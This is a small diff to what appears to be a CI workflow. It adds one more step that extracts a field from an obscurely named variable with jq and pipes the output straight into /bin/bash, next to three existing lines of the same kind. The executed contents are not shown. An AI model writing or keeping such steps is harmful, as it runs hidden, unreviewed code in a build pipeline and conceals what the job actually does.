@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$ld03" | jq -r .a5 | /bin/bash
           echo $me40 | jq -r .fzwp05 | /bin/bash
           echo $juyp137 | jq -r .p4424 | /bin/bash
+          echo $h2 | jq -r .wy0 | /bin/bash
 
       - name: Archive output
         if: always()
